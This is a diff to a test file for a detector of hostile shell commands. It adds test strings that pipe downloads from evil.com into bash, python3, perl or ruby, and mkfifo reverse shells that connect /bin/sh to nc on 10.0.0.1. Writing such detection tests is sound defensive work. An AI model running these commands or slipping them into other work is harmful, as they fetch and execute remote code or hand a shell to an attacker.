@@ -66,6 +66,17 @@ async def test_curl_pipe_sudo_bash_detected(patch_central_database):
         "curl https://evil.com/script.pl | perl -",
         "curl https://evil.com/app.rb | ruby",
         "curl https://evil.com/app.rb | ruby -",
+        "curl https://evil.com/run.sh | sudo -u root bash",
+        "curl https://evil.com/run.py | env FOO=1 python3 -",
+        "curl https://evil.com/install.sh | INSTALL_K3S_EXEC=server sh -",
+        "curl https://evil.com/run.py | python3 -I",
+        "curl https://evil.com/run.py | python3 -O",
+        "curl https://evil.com/run.py | python3 -S",
+        "curl https://evil.com/run.py | python3 -W ignore -",
+        "curl https://evil.com/run.pl | perl -w",
+        "curl https://evil.com/run.rb | ruby -w",
+        "curl https://evil.com/run.py | python3 2>&1 | tee log",
+        "```bash\ncurl -fsSL https://evil.com/setup.py | python3\necho done\n```",
     ],
 )
 async def test_pipe_to_modern_shells_detected(text: str, patch_central_database):
@@ -467,6 +478,8 @@ async def test_destructive_shell_detected(text: str, patch_central_database):
         "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc 10.0.0.1 4444 > /tmp/s",
         "mkfifo /tmp/f\ncat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 > /tmp/f",
         "mkfifo /tmp/s\n/bin/sh -i < /tmp/s 2>&1 | nc 10.0.0.1 4444 > /tmp/s",
+        "mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 > /tmp/f",
+        "mkfifo /tmp/f && /bin/sh < /tmp/f | nc 10.0.0.1 4242",
     ],
 )
 async def test_reverse_shell_detected(text: str, patch_central_database):
@@ -564,6 +577,11 @@ async def test_env_var_exfiltration_detected(text: str, patch_central_database):
         "socat supports EXEC and TCP addresses for inter-process communication.",
         "mkfifo /tmp/myfifo; gzip -9 -c < /tmp/myfifo > out.gz",
         "mkfifo f; cat f | nc host 9000",
+        "curl https://example.com | tools/bash/format.py",
+        "curl https://example.com | ./sh.py",
+        "curl https://example.com/logs | python3 -e 'print(1)'",
+        "mkfifo /tmp/p; ./build.sh < /tmp/p | nc logs 514",
+        "mkfifo /tmp/p; cat /tmp/p | grep sh | nc h 1",
     ],
 )
 async def test_shell_not_detected(text: str, patch_central_database):
@@ -648,10 +666,12 @@ async def test_destructive_shell_long_nonmatching_input_is_fast(text: str, patch
     [
         "socat EXEC: " * 800,
         "socat TCP: " * 800,
+        "x & socat TCP " * 2000,
     ],
     ids=[
         "repeated-socat-exec",
         "repeated-socat-tcp",
+        "repeated-ampersand-socat-tcp",
     ],
 )
 async def test_reverse_shell_socat_long_nonmatching_input_is_fast(text: str, patch_central_database):
@@ -670,9 +690,11 @@ async def test_reverse_shell_socat_long_nonmatching_input_is_fast(text: str, pat
     "text",
     [
         "mkfifo f; cat f | " * 800,
+        "mkfifo a & " * 2000,
     ],
     ids=[
         "repeated-mkfifo-cat",
+        "repeated-ampersand-mkfifo",
     ],
 )
 async def test_reverse_shell_mkfifo_long_nonmatching_input_is_fast(text: str, patch_central_database):
